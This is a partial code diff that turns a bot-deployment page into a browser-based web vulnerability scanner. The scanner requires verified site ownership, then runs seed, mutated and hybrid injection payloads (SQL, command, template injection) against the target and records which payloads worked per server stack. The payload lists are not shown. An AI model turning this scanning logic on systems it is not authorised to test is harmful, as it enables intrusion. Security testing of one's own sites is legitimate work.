+      result.innerHTML=`<span class="badge badge-err">[X] ECHEC - ${why}</span>`;
+    }
+  } catch(e) {
+    result.innerHTML=`<span class="badge badge-err">[X] ${esc(e.message)}</span>`;
+    toast('Impossible de verifier - placez d\'abord le fichier sur votre serveur','err');
+  }
+}
+
+// ?? Scan UI ???????????????????????????????????????????????
+function updateScanUI() {
+  const p=currentProj;
+  const noProj=document.getElementById('scan-no-proj');
+  const content=document.getElementById('scan-content');
+  if (!p||!p.verified) {
+    noProj.style.display='block';
+    noProj.textContent=p&&!p.verified
+      ?'[lock] Projet non verifie - allez dans Verification.'
+      :'Selectionnez un projet verifie.';
+    content.style.display='none';
+    return;
+  }
+  noProj.style.display='none';
+  content.style.display='block';
+  renderFamilyToggles();
+}
+
+function renderFamilyToggles() {
+  const el=document.getElementById('family-toggles');
+  el.innerHTML=Object.entries(ATTACK_DNA).map(([id,dna])=>`
+    <label class="toggle-item on" id="toggle-wrap-${id}">
+      <input type="checkbox" id="toggle-${id}" checked/>
+      <span style="color:${dna.color}">${id.toUpperCase()}</span>
+      <span style="color:var(--muted);font-size:.65rem;margin-left:auto">${dna.severity}</span>
+    </label>
+  `).join('');
+
+  el.querySelectorAll('input[type=checkbox]').forEach(cb=>{
+    cb.addEventListener('change', ()=>{
+      const wrap=cb.closest('.toggle-item');
+      wrap.classList.toggle('on',cb.checked);
+    });
+  });
+}
+
+// ?? Stack detection UI ????????????????????????????????????
+function showStack(stack) {
+  const card=document.getElementById('stack-card');
+  const el=document.getElementById('stack-display');
+  if (!stack||stack.name==='unknown') { card.style.display='none'; return; }
+  card.style.display='block';
+  const serverHeader=Object.entries(stack.headers).find(([k])=>k==='server');
+  el.innerHTML=`
+    <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap">
+      <span class="stack-chip">[..] ${stack.name.toUpperCase()} detecte</span>
+      ${serverHeader?`<span class="badge badge-info">server: ${esc(serverHeader[1])}</span>`:''}
+      <span style="font-size:.72rem;color:var(--muted)">Familles prioritaires > </span>
+      ${stack.priority.slice(0,4).map(f=>
+        `<span class="badge" style="background:rgba(255,255,255,.05);color:${ATTACK_DNA[f]?.color||'var(--text)'};border-color:var(--border2)">${f.toUpperCase()}</span>`
+      ).join('')}
+    </div>
+    <p style="font-size:.7rem;color:var(--muted);margin-top:8px">
+      Ces familles seront testees en priorite. Les autres suivront.
+    </p>
   `;
 }
 
-function updateStep(n) {
-  for (let i = 1; i <= 3; i++) {
-    document.getElementById(`step-${i}`).classList.toggle('active', i <= n);
+// ?? Core scanner ??????????????????????????????????????????
+async function startScan() {
+  if (!currentProj?.verified) { toast('Projet non verifie','err'); return; }
+  if (scanning) return;
+
+  scanning=true; stopFlag=false;
+  document.getElementById('btn-start-scan').disabled=true;
+  document.getElementById('btn-stop-scan').style.display='inline-flex';
+  document.getElementById('running-card').style.display='block';
+  document.getElementById('scan-log').innerHTML='';
+  setProgress(0);
+
+  const baseUrl = currentProj.url;
+  const depth   = document.getElementById('scan-depth').value;
+  const delay   = Math.max(50, parseInt(document.getElementById('scan-delay').value)||300);
+  const enabled = Object.keys(ATTACK_DNA).filter(id=>{
+    const cb=document.getElementById('toggle-'+id);
+    return cb?.checked;
+  });
+
+  log(`[ZMB] Zombie Hacking V4 DNA - ${baseUrl}`,'ok');
+  log(`[..] Detection du stack...`,'info');
+
+  // Detect stack and reorder enabled families by priority
+  detectedStack = await detectStack(baseUrl);
+  showStack(detectedStack);
+
+  if (detectedStack.name !== 'unknown') {
+    log(`[>>] Stack detecte: ${detectedStack.name.toUpperCase()}`,'purple');
+    // Reorder enabled by priority
+    const priority = detectedStack.priority.filter(f=>enabled.includes(f));
+    const rest     = enabled.filter(f=>!priority.includes(f));
+    enabled.length=0;
+    enabled.push(...priority,...rest);
+    log(`[**] Ordre d'attaque optimise: ${enabled.join(' > ')}`,'purple');
   }
+
+  log(`[--] Familles: ${enabled.join(', ')}`,'info');
+
+  const combos  = computeCombos().filter(c=>enabled.includes(c.a1)&&enabled.includes(c.a2));
+  log(`[~~] Combos calcules: ${combos.length}`,'info');
+
+  // Build vector list
+  const vectors = [];
+
+  for (const id of enabled) {
+    const dna=ATTACK_DNA[id];
+    for (const seed of dna.seeds) {
+      vectors.push({type:'seed', id, dna, seed});
+    }
+  }
+
+  if (depth==='mutations'||depth==='full') {
+    for (const id of enabled) {
+      const dna=ATTACK_DNA[id];
+      const rules=MUTATION_RULES[dna.mutation_pool]||[];
+      for (const seed of dna.seeds) {
+        for (const rule of rules) {
+          try {
+            const mut=rule.fn(seed.value);
+            if (mut!==seed.value)
+              vectors.push({type:'mutation', id, dna, seed:{...seed,value:mut}, mutName:rule.name});
+          } catch {}
+        }
+      }
+    }
+  }
+
+  if (depth==='full') {
+    for (const combo of combos) {
+      const dna1=ATTACK_DNA[combo.a1], dna2=ATTACK_DNA[combo.a2];
+      for (const s of dna1.seeds)
+        vectors.push({type:'hybrid', id:`${combo.a1}+${combo.a2}`, dna:dna1, seed:s, subId:combo.a1});
+      for (const s of dna2.seeds)
+        vectors.push({type:'hybrid', id:`${combo.a1}+${combo.a2}`, dna:dna2, seed:s, subId:combo.a2});
+    }
+  }
+
+  log(`[>>] ${vectors.length} vecteurs a tester`,'info');
+  document.getElementById('scan-status').textContent=`0 / ${vectors.length}`;
+
+  const findings=[];
+  let tested=0;
+
+  for (const vec of vectors) {
+    if (stopFlag) { log('[stop] Scan interrompu par l\'utilisateur','warn'); break; }
+
+    tested++;
+    setProgress(tested/vectors.length*100);
+    document.getElementById('scan-status').textContent=`${tested} / ${vectors.length} - ${findings.length} failles`;
+    document.getElementById('scan-summary').textContent=`${findings.length} failles`;
+
+    // Check explored cache
+    const eid = hashStr(vec.id+'|'+vec.seed.value+'|'+baseUrl);
+    const seen = await dbGet('explored', eid);
+    if (seen) continue;
+
+    const result = await probe(baseUrl, vec.seed);
+    await dbPut('explored',{id:eid, ts:Date.now()});
+
+    if (!result) continue;
+    const {text, status, ms, url} = result;
+
+    const triggered = evalSigs(vec.dna.signatures||[], text, status, vec.seed.value, ms);
+
+    if (triggered.length) {
+      const finding = {
+        id:        'f_'+Date.now()+'_'+Math.random().toString(36).slice(2,6),
+        project:   currentProj.domain,
+        family:    vec.id,
+        subFamily: vec.subId||vec.id,
+        payload:   vec.seed.value,
+        url, status, triggered,
+        is_mutation: vec.type==='mutation',
+        is_hybrid:   vec.type==='hybrid',
+        mutName:     vec.mutName||null,
+        snippet:     text.slice(0,120),
+        ts:          Date.now(),
+      };
+      findings.push(finding);
+      await dbPut('findings', finding);
+      await learnPattern(detectedStack?.name||'unknown', vec.id, vec.seed.value);
+
+      const icon=vec.type==='hybrid'?'[HYB]':vec.type==='mutation'?'[MUT]':'[SED]';
+      const sigStr=triggered.join(', ');
+      log(`[HIT] ${icon} [${vec.id}] ${vec.seed.value.slice(0,38)} > ${sigStr}`,'err');
+    }
+
+    await sleep(delay);
+  }
+
+  // Done
+  scanning=false;
+  document.getElementById('btn-start-scan').disabled=false;
+  document.getElementById('btn-stop-scan').style.display='none';
+  document.getElementById('scan-status').textContent=`[OK] Termine - ${findings.length} failles / ${tested} testes`;
+  document.getElementById('scan-spin').style.display='none';
+  setProgress(100);
+  log(`\n[OK] Scan termine. ${findings.length} failles confirmees sur ${tested} vecteurs.`,'ok');
+
+  currentProj.scan_count=(currentProj.scan_count||0)+1;
+  await dbPut('projects',currentProj);
+
+  await renderFindings();
+  await updateMemoryStats();
+  updateNavBadge();
+  toast(`${findings.length} faille(s) detectee(s)`, findings.length?'warn':'ok');
 }
 
-function copyCode() {
-  const code = document.getElementById('code-display').textContent;
-  navigator.clipboard.writeText(code);
-  alert('Code copied to clipboard!');
+function stopScan() {
+  stopFlag=true;
+  scanning=false;
 }
 
-// ================================================================
-// INIT
-// ================================================================
+// ?? Pattern learning ??????????????????????????????????????
+async function learnPattern(stack, attackId, payload) {
+  const existing = await dbGet('dna_learned', stack) || {id:stack, patterns:{}};
+  if (!existing.patterns[attackId]) existing.patterns[attackId]=[];
+  if (!existing.patterns[attackId].includes(payload))
+    existing.patterns[attackId].push(payload);
+  await dbPut('dna_learned', existing);
+}
 
-showStatus('info', 'Configure your bot credentials, choose functions, then deploy to Cloudflare Workers in one click.');
+// ?? Findings ??????????????????????????????????????????????
+async function renderFindings() {
+  const all   = await dbGetAll('findings');
+  const expl  = await dbGetAll('explored');
+  const found = currentProj ? all.filter(f=>f.project===currentProj.domain) : all;
+
+  document.getElementById('s-total').textContent   = found.length;
+  document.getElementById('s-crit').textContent    = found.filter(f=>['sqli','cmdi','ssti'].includes(f.subFamily)).length;
+  document.getElementById('s-hybrid').textContent  = found.filter(f=>f.is_hybrid).length;
+  document.getElementById('s-explored').textContent= expl.length;
+
+  const tbody=document.getElementById('findings-body');
+  if (!found.length) {
+    tbody.innerHTML='<tr><td colspan="6" style="color:var(--muted);text-align:center;padding:24px">Aucune faille - lancez un scan.</td></tr>';
+    return;
+  }
+
+  tbody.innerHTML=found.slice().reverse().map(f=>{
+    const icon   = f.is_hybrid?'[HYB] HYBRIDE':f.is_mutation?`[MUT] ${f.mutName||'MUT'}`:'[SED] SEED';
+    const dna    = ATTACK_DNA[f.subFamily];
+    const col    = dna?.color||'var(--red)';
+    const sigs   = (f.triggered||[]).map(s=>`<span class="badge badge-err" style="font-size:.6rem">${s}</span>`).join(' ');
+    const dt     = new Date(f.ts).toLocaleTimeString('fr-FR');
+    return `<tr>
+      <td><span style="color:${col};font-size:.76rem">${f.family.toUpperCase()}</span></td>
+      <td class="td-payload">${esc(f.payload.slice(0,55))}</td>
+      <td>${sigs}</td>
+      <td class="td-url">${esc(f.url.slice(0,50))}</td>
+      <td style="font-size:.68rem;color:var(--muted)">${icon}</td>
+      <td style="font-size:.68rem;color:var(--muted)">${dt}</td>
+    </tr>`;
+  }).join('');
+
+  updateNavBadge();
+}
+
+function updateNavBadge() {
+  dbGetAll('findings').then(all=>{
+    const el=document.getElementById('nav-findings-count');
+    if (all.length) { el.textContent=all.length; el.style.display=''; }
+    else el.style.display='none';
+  });
+}
+
+async function exportFindings() {
+  const all=await dbGetAll('findings');
+  const blob=new Blob([JSON.stringify(all,null,2)],{type:'application/json'});
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(blob);
+  a.download=`zombie-findings-${Date.now()}.json`;
+  a.click();
+}
+
+async function clearFindings() {
+  await dbClear('findings');
+  await renderFindings();
+  toast('Failles supprimees','warn');
+}
+
+// ?? DNA tab ???????????????????????????????????????????????
+function renderDNA() {
+  // Grid
+  document.getElementById('dna-grid').innerHTML=
+    Object.entries(ATTACK_DNA).map(([id,dna])=>`
+      <div class="dna-card">
+        <div class="dna-id" style="color:${dna.color}">${id.toUpperCase()}</div>
+        <div class="dna-name">${dna.name}</div>
+        <div class="dna-meta">${dna.seeds.length} seeds ? pool: ${dna.mutation_pool}</div>
+        <div class="dna-meta" style="margin-top:3px">
+          ${dna.signatures.map(s=>`<span class="badge badge-info" style="font-size:.58rem">${s}</span>`).join(' ')}
+        </div>
+      </div>
+    `).join('');
+
+  // Combos
+  const combos=computeCombos();
+  document.getElementById('combos-display').innerHTML=combos.length
+    ? combos.map(c=>`
+        <span style="color:${ATTACK_DNA[c.a1].color}">${c.a1.toUpperCase()}</span>
+        <span style="color:var(--muted)"> ? </span>
+        <span style="color:${ATTACK_DNA[c.a2].color}">${c.a2.toUpperCase()}</span>
+        <span style="color:var(--muted);font-size:.72rem"> > ${c.shared.join(', ')}</span><br/>
+      `).join('')
+    : '<span style="color:var(--muted)">Aucun combo.</span>';
+
+  // Mutation rules
+  document.getElementById('mutation-display').innerHTML=
+    Object.entries(MUTATION_RULES).map(([type,rules])=>`
+      <div style="margin-bottom:14px">
+        <div style="color:var(--acc);font-size:.68rem;letter-spacing:.12em;margin-bottom:7px">${type.toUpperCase()}</div>
+        <div style="display:flex;flex-wrap:wrap;gap:5px">
+          ${rules.map(r=>`<span class="badge badge-info" style="font-size:.65rem">${r.name}</span>`).join('')}
+        </div>
+      </div>
+    `).join('');
+}
+
+// ?? Memory ????????????????????????????????????????????????
+async function updateMemoryStats() {
+  const findings = await dbGetAll('findings');
+  const explored = await dbGetAll('explored');
+  const learned  = await dbGetAll('dna_learned');
+
+  document.getElementById('m-findings').textContent = findings.length;
+  document.getElementById('m-explored').textContent = explored.length;
+  document.getElementById('m-learned').textContent  =
+    learned.reduce((acc,l)=>acc+Object.keys(l.patterns||{}).length,0);
+
+  const el=document.getElementById('learned-display');
+  if (!learned.length) {
+    el.textContent='Aucun pattern appris - lancez des scans.';
+    return;
+  }
+  el.innerHTML=learned.map(l=>`
+    <div style="border:1px solid var(--border);border-radius:6px;padding:12px;margin-bottom:10px">
+      <div class="stack-chip" style="margin-bottom:8px">Stack: ${esc(l.id)}</div>
+      ${Object.entries(l.patterns||{}).map(([atk,payloads])=>`
+        <div style="margin:4px 0;font-size:.74rem">
+          <span style="color:${ATTACK_DNA[atk]?.color||'var(--orange)'}">${atk.toUpperCase()}</span>
+          <span style="color:var(--muted)"> - ${payloads.length} pattern(s) efficace(s)</span>
+        </div>
+      `).join('')}
+    </div>
+  `).join('');
+}
+
+async function clearAllMemory() {
+  for (const s of ['findings','explored','dna_learned']) await dbClear(s);
+  await updateMemoryStats();
+  await renderFindings();
+  toast('Memoire videe','warn');
+}
+
+// ?? Utils ?????????????????????????????????????????????????
+function sleep(ms) { return new Promise(r=>setTimeout(r,ms)); }
+function esc(s='') { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function hashStr(s){ let h=0; for(const c of s)h=(Math.imul(31,h)+c.charCodeAt(0))|0; return 'h'+Math.abs(h); }
+
+// ?? Init ??????????????????????????????????????????????????
+async function init() {
+  // Open DB
+  try {
+    db = await openDB();
+    document.getElementById('db-dot').className='status-dot online';
+    document.getElementById('db-status').textContent='IndexedDB OK';
+  } catch(e) {
+    document.getElementById('db-status').textContent='DB ERROR';
+    console.error(e);
+    return;
+  }
+
+  // Nav clicks
+  document.querySelectorAll('.nav-item').forEach(item=>{
+    item.addEventListener('click', ()=>{
+      navigate(item.dataset.page);
+      if (item.dataset.page==='findings') renderFindings();
+      if (item.dataset.page==='memory')   updateMemoryStats();
+    });
+  });
+
+  // Button bindings
+  document.getElementById('btn-create').addEventListener('click', createProject);
+  document.getElementById('btn-download-pp').addEventListener('click', downloadPP);
+  document.getElementById('btn-verify').addEventListener('click', verifyOwnership);
+  document.getElementById('btn-start-scan').addEventListener('click', startScan);
+  document.getElementById('btn-stop-scan').addEventListener('click', stopScan);
+  document.getElementById('btn-export').addEventListener('click', exportFindings);
+  document.getElementById('btn-clear-findings').addEventListener('click', clearFindings);
+  document.getElementById('btn-refresh-mem').addEventListener('click', updateMemoryStats);
+  document.getElementById('btn-clear-all').addEventListener('click', clearAllMemory);
+
+  // Initial renders
+  await renderProjects();
+  await renderFindings();
+  renderDNA();
+  await updateMemoryStats();
+  updateNavBadge();
+}
+
+init();
+
+})(); // end IIFE
 </script>
-
 </body>
 </html>
